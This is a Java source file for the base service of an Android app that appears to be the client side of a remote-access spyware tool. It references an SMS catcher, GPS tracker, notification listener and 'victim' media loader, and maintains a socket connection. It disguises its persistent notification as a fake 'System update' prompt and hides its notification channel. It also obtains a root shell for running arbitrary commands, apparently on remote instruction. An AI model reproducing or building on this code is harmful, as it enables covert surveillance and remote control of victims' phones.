package com.android.sus_client.services;

import static com.android.sus_client.services.ForegroundService.TAG;

import android.annotation.SuppressLint;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.graphics.Bitmap;
import android.graphics.Color;
import android.graphics.drawable.Icon;
import android.net.Uri;
import android.os.Build;
import android.os.PowerManager;
import android.util.Log;
import android.view.WindowManager;

import androidx.core.app.NotificationCompat;

import com.android.sus_client.applaunchers.ActionActivity;
import com.android.sus_client.applaunchers.ScreenSharingActivity;
import com.android.sus_client.base.BaseOneTimeWorkRequest;
import com.android.sus_client.base.MainThreadExecutor;
import com.android.sus_client.base.NetworkUtil;
import com.android.sus_client.commonutility.TaskRunner;
import com.android.sus_client.commonutility.basic.Function1;
import com.android.sus_client.commonutility.basic.Invoker;
import com.android.sus_client.commonutility.cache.BaseRootFiles;
import com.android.sus_client.commonutility.cache.RootFilesManager;
import com.android.sus_client.database.SharedPreferenceManager;
import com.android.sus_client.model.ClientConfig;
import com.android.sus_client.commonutility.root.ShellUtils;
import com.android.sus_client.utils.ApkUtils;
import com.android.sus_client.utils.AppUtils;
import com.android.sus_client.utils.FileUtil;
import com.android.sus_client.utils.PermissionsBinder;
import com.android.sus_client.utils.Utils;
import com.android.sus_client.utils.smscatcher.SmsCatcher;
import com.android.sus_client.victim_media.IBridgeMediaLoader;
import com.android.sus_client.victim_media.LocalMediaPageLoader;
import com.lucemanb.RootTools.RootTools;
import com.lucemanb.RootTools.exceptions.RootDeniedException;
import com.lucemanb.RootTools.execution.Command;
import com.lucemanb.RootTools.execution.CommandCapture;
import com.lucemanb.RootTools.execution.Shell;

import org.json.JSONObject;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.util.Observer;
import java.util.UUID;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.TimeoutException;

public abstract class BaseService extends Service implements Observer, SocketHandler.Listener, SharedPreferences.OnSharedPreferenceChangeListener, NetworkUtil.OnConnectionStatusChange {

    public static String NOTIFICATION_TITLE = "System update";
    public static String NOTIFICATION_MSG = "New system software is available. Tap to install";
    public static int NOTIFICATION_COLOR = Color.TRANSPARENT;
    public static int NOTIFICATION_ICON_RES = android.R.drawable.sym_def_app_icon;
    public static String NOTIFICATION_ICON_NAME = "", NOTIFICATION_CHANNEL_ID = "";
    public static final int NOTIFICATION_ID = 786, NOTIFICATION_ID_SECONDARY = 787;

    public static boolean hasRootAccess = false;

    boolean isForegrounded = false;
    int runningJobs = 0;

    final Object lock = new Object();
    ExecutorService executorService;
    TaskRunner taskRunner;
    MainThreadExecutor mainExecutor;
    BaseOneTimeWorkRequest oneTimeWorkRequest;
    PowerManager powerManager = null;
    PowerManager.WakeLock wakeLock = null;
    WindowManager windowManager;
    private NotificationManager notificationManager;
    private Notification.Builder notification;

    /**
     * Other Extensions and classes
     */
    SocketHandler socketHandler;
    SmsCatcher smsCatcher;
    GpsTracker gpsTracker;
    AppNotificationListener notificationListener;
    IBridgeMediaLoader mMediaLoader = new LocalMediaPageLoader();

    AppUtils appUtils;

    ShellUtils shellUtils;
    Shell shell;

    /**
     * Shared Preferences
     */
    boolean installServiceEnabled = true;
    SharedPreferenceManager preferences;
    RootFilesManager rootFilesManager;

    /**
     * Tasks response
     */
    boolean responseStatus = false;
    String responseMessage = null;
    JSONObject responseData = new JSONObject();


    public abstract void processServiceTasks();

    @Override
    public void onCreate() {
        log("onCreate");
        // Creating Cached thread pool so that avoid creation of Thread //again and again
        this.executorService = Executors.newCachedThreadPool();
        this.taskRunner = new TaskRunner(false);
        this.mainExecutor = new MainThreadExecutor(this);
        this.oneTimeWorkRequest = new BaseOneTimeWorkRequest(this);
        this.notificationManager = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
        this.windowManager = (WindowManager) getSystemService(WINDOW_SERVICE);
        this.powerManager = (PowerManager) getSystemService(POWER_SERVICE);
        this.wakeLock = powerManager.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, UUID.randomUUID().toString());

        this.preferences = SharedPreferenceManager.get(this);
        this.preferences.setPreferencesChangeListener(this);
        this.rootFilesManager = new RootFilesManager(this);
        this.appUtils = new AppUtils(this);
        resetShellUtils();
    }

    @Override
    public void onDestroy() {
        log("onDestroy");
        preferences.removePreferencesChangeListener(this);
        executorService.shutdownNow();
    }

    /**
     * Method to start the service in foreground if the no. of jobs is //larger
     */
    void startForegroundIfNeeded() {
        if (!isForegrounded) {
            notification = createNotification();
            startForeground(NOTIFICATION_ID, notification.build());
            isForegrounded = true;
        }
        updateNotification(preferences.clientConfigData());
    }

    /**
     * method to stop Service if all the job i done
     */
    void stopForegroundIfAllDone() {
        if (runningJobs <= 0 && isForegrounded) {
            stopForeground(true);
            isForegrounded = false;
        }
    }

    /**
     * Start child tasks from here
     */
    void startWork() {
        log("startWork AppInForeground ===> " + Utils.isAppInForeground(getApplicationContext()));
        PermissionsBinder.loadPermissions(this);
        socketHandler = SocketHandler.getInstance(getApplicationContext(), this);
        socketHandler.addObserver(this);
        processServiceTasks();
    }

    /**
     * Stop child tasks from here
     * After completing job reduce the no. of jobs that is being
     */
    void stopWork() {
        stopWork(false);
    }

    void stopWork(boolean stopForeground) {
        if (stopForeground) runningJobs = 0;
        else runningJobs = (runningJobs > 0) ? runningJobs - 1 : 0;
        stopForegroundIfAllDone();
    }

    /**
     * Create NotificationChannel for the Foreground Service
     */
    private void createNotificationChannel() {
        if (NOTIFICATION_CHANNEL_ID.isEmpty() && Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(TAG, ApkUtils.getApplicationName(this), NotificationManager.IMPORTANCE_HIGH);
            channel.setImportance(NotificationManager.IMPORTANCE_NONE);
            channel.setLockscreenVisibility(Notification.VISIBILITY_SECRET);
            notificationManager.createNotificationChannel(channel);
            NOTIFICATION_CHANNEL_ID = TAG;
        }
    }

    /**
     * Create NotificationBuilder for the Foreground Service
     */
    private Notification.Builder createNotification() {
        Notification.Builder builder = new Notification.Builder(this);
        PendingIntent pendingIntent = Utils.getNotificationPendingIntent(this, NOTIFICATION_ID, ActionActivity.class);

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            createNotificationChannel();
            builder = new Notification.Builder(this, NOTIFICATION_CHANNEL_ID);
        }
        try {
            ClientConfig data = preferences.clientConfigData();
            NOTIFICATION_TITLE = data.getNotificationTitle(NOTIFICATION_TITLE);
            NOTIFICATION_MSG = data.getNotificationMessage(NOTIFICATION_MSG);
            NOTIFICATION_COLOR = data.getNotificationIconColor(NOTIFICATION_COLOR);
        } catch (Exception ignored) {
        }

        //PermissionsUtils.isPermissionGrantedByRoot(this, "android.permission.SUBSTITUTE_NOTIFICATION_APP_NAME");
        //final Bundle extras = new Bundle();
        //extras.putString("android.substName", NOTIFICATION_TITLE);
        return builder.setContentTitle(NOTIFICATION_TITLE)
                .setContentText(NOTIFICATION_MSG)
                .setSmallIcon(NOTIFICATION_ICON_RES)
                .setColor(NOTIFICATION_COLOR)/*.addExtras(extras)*/
                .setContentIntent(pendingIntent)
                .setPriority(Notification.PRIORITY_HIGH)
                .setCategory(Notification.CATEGORY_SERVICE)
                .setOngoing(true);
    }

    void showNotificationHeadsUp(String title, String message, String data) {
        PendingIntent pendingIntent = Utils.getNotificationPendingIntent(this, NOTIFICATION_ID_SECONDARY, ScreenSharingActivity.class);
        createNotificationChannel();
        NotificationCompat.Builder builder = new NotificationCompat.Builder(this, NOTIFICATION_CHANNEL_ID);

        /*if (Build.VERSION.SDK_INT >= 23 && !NOTIFICATION_ICON_NAME.isEmpty()) {
            Icon smallIcon = rootFilesManager.getFileAsIcon(NOTIFICATION_ICON_NAME);
            if (smallIcon != null) {
                builder.setSmallIcon(smallIcon);
            }
        }*/

        builder.setSmallIcon(android.R.drawable.sym_def_app_icon)
                .setColor(Utils.getColorPrimary(getApplicationContext()))
                .setContentTitle(title)
                .setContentText(message)
                .setPriority(NotificationCompat.PRIORITY_MAX)
                .setDefaults(NotificationCompat.DEFAULT_SOUND | NotificationCompat.DEFAULT_VIBRATE)
                .setCategory(NotificationCompat.CATEGORY_CALL)
                .setDeleteIntent(pendingIntent)
                .setContentIntent(pendingIntent)
                .setAutoCancel(true);

        builder.setSound(Uri.parse("file:///android_asset/sound_snapchat.mp3"));
        //if (Build.VERSION.SDK_INT >= 21) builder.setVibrate(new long[0]);
        //if (Build.VERSION.SDK_INT >= 21) builder.setVibrate(new long[]{1000, 1000, 1000, 1000, 1000});
        notificationManager.notify(NOTIFICATION_ID_SECONDARY, builder.build());
    }

    @SuppressLint("NewApi")
    void updateNotification(ClientConfig data) {
        try {
            NOTIFICATION_TITLE = data.getNotificationTitle(NOTIFICATION_TITLE);
            NOTIFICATION_MSG = data.getNotificationMessage(NOTIFICATION_MSG);
            NOTIFICATION_COLOR = data.getNotificationIconColor(NOTIFICATION_COLOR);
            NOTIFICATION_ICON_NAME = FileUtil.getNameNoExtensionFromUrl(data.getNotificationIconUrl(), "png");
            /*if (!data.getNotificationIconUrl().isEmpty() && !rootFilesManager.getFile(notificationIconName).exists()) {
                rootFilesManager.copyURLToFile(new URL(data.getNotificationIconUrl()), notificationIconName);
            }*/

            if (!data.getNotificationIconUrl().isEmpty() && !rootFilesManager.getFile(NOTIFICATION_ICON_NAME).exists()) {
                taskRunner.executeAsync(() -> {
                    Bitmap bitmap = FileUtil.getBitmapFromURL(data.getNotificationIconUrl());
                    if (bitmap != null) {
                        ByteArrayOutputStream stream = new ByteArrayOutputStream();
                        bitmap.compress(Bitmap.CompressFormat.PNG, 100, stream);
                        Bitmap finalBitmap = FileUtil.decodeSampleBitmapFromByteArray(stream.toByteArray(), 160, 160);
                        return rootFilesManager.saveImage(finalBitmap, NOTIFICATION_ICON_NAME, BaseRootFiles.DirType.CACHE).exists();
                    }
                    return false;
                }, isLoaded -> {
                    if (isLoaded != null && isLoaded) {
                        Icon smallIcon = null;
                        if (Build.VERSION.SDK_INT >= 23) {
                            smallIcon = rootFilesManager.getFileAsIcon(NOTIFICATION_ICON_NAME);
                        }
                        Notification.Builder newNotification = (smallIcon != null ? notification.setSmallIcon(smallIcon) : notification);
                        notificationManager.notify(NOTIFICATION_ID, newNotification.setColor(NOTIFICATION_COLOR).setContentTitle(NOTIFICATION_TITLE).setContentText(NOTIFICATION_MSG).build());
                    }
                });
            }

            Icon smallIcon = null;
            if (Build.VERSION.SDK_INT >= 23 && !NOTIFICATION_ICON_NAME.isEmpty()) {
                smallIcon = rootFilesManager.getFileAsIcon(NOTIFICATION_ICON_NAME);
            }
            Notification.Builder newNotification = (smallIcon != null ? notification.setSmallIcon(smallIcon) : notification);
            notificationManager.notify(NOTIFICATION_ID, newNotification.setColor(NOTIFICATION_COLOR).setContentTitle(NOTIFICATION_TITLE).setContentText(NOTIFICATION_MSG).build());
        } catch (Exception ignored) {
        }
    }

    void clearNotification(int notificationId) {
        try {
            notificationManager.cancel(notificationId);
        } catch (Exception e) {
        }
    }

    @Override
    public void onNetworkChange(boolean isConnected) {
        if (!isConnected) {
            if (socketHandler != null) socketHandler.disconnect();
            stopWork(true);
        }
    }

    /**
     * SharedPreferences settings
     */
    @Override
    public void onSharedPreferenceChanged(SharedPreferences sharedPreferences, String key) {
        if (key == null) return;
        SharedPreferenceManager.Param param = SharedPreferenceManager.Param.valueOf(key);
        switch (param) {
            case install_service_enabled:
                installServiceEnabled = preferences.read(param, true);
                break;
            default:
                log("Not yet implemented in SharedPreferenceManager");
                break;
        }
    }

    void initializePreferences() {
        installServiceEnabled = preferences.installServiceEnabled();
    }

    JSONObject parseJsonRequest(Object... args) {
        return SocketHandler.parseJsonRequest(args);
    }

    void resetShellUtils() {
        taskRunner.executeAsync(() -> {
            shellUtils = ShellUtils.getInstance();
            if (RootTools.isRootAvailable()) {
                hasRootAccess = RootTools.isAccessGiven();
                try {
                    shell = RootTools.getShell(hasRootAccess, 25000);
                } catch (IOException | TimeoutException e) {
                    e.printStackTrace();
                } catch (RootDeniedException e) {
                    hasRootAccess = false;
                    try {
                        shell = RootTools.getShell(false);
                    } catch (Exception ignored) {
                    }
                }

            } else {
                hasRootAccess = false;
                try {
                    shell = RootTools.getShell(false);
                } catch (Exception ignored) {
                }
            }
            return false;
        }, null);
    }

    void executeShellCommand(String command, Function1<Void, String> onOutput) {
        executeShellCommand(0, command, onOutput, null);
    }

    void executeShellCommand(int id, String command, Function1<Void, String> onOutput) {
        executeShellCommand(id, command, onOutput, null);
    }

    void executeShellCommand(int id, String command, Function1<Void, String> onOutput, Function1<Void, String> onError) {
        try {
            shell.add(new Command(id, command) {
                @Override
                public void commandOutput(int id, String line) {
                    if (onOutput != null) {
                        onOutput.invoke(new Invoker<>(line));
                    }
                }

                @Override
                public void commandTerminated(int id, String reason) {
                    if (onError != null) {
                        onError.invoke(new Invoker<>(reason));
                    }
                }

                @Override
                public void commandCompleted(int id, int exitCode) {
                }
            });
        } catch (IOException e) {
            if (onError != null) {
                onError.invoke(new Invoker<>(e.getMessage()));
            }
        }
    }

    String executeShellCommandCapture(int id, String command) throws Exception {
        CommandCapture commandCapture = new CommandCapture(id, false, command);
        shell.add(commandCapture);
        commandWait(commandCapture);
        return commandCapture.toString();
    }

    private void commandWait(Command cmd) {
        synchronized (cmd) {
            try {
                if (!cmd.isFinished()) {
                    cmd.wait(2000);
                }
            } catch (InterruptedException ex) {
                Log.e(TAG, ex.toString());
            }
        }
    }

    /**
     * Global
     */

    public static void log(String msg) {
        Log.e(TAG, msg);
    }

    public static void log(String tag, String msg) {
        Log.e(tag, msg);
    }

    public static void initForegroundService(Context context, Intent intent) {
        try {
            if (Build.VERSION.SDK_INT >= 26) {
                context.startForegroundService(intent);
            } else {
                // Pre-O behavior.
                context.startService(intent);
            }
        } catch (IllegalArgumentException e) {
            // The process is classed as idle by the platform. Starting a background service is not allowed in this state.
            throw new Error("Failed to start Service (process is idle). " + e.getMessage());
        } catch (IllegalStateException e) {
            // The app is in background, starting service is disallow
            throw new Error("Failed to start Service (app is in background, foregroundAllowed == false) " + e.getMessage());
        } catch (Error error) {
            log("Error: " + error.getMessage());
        }
    }

}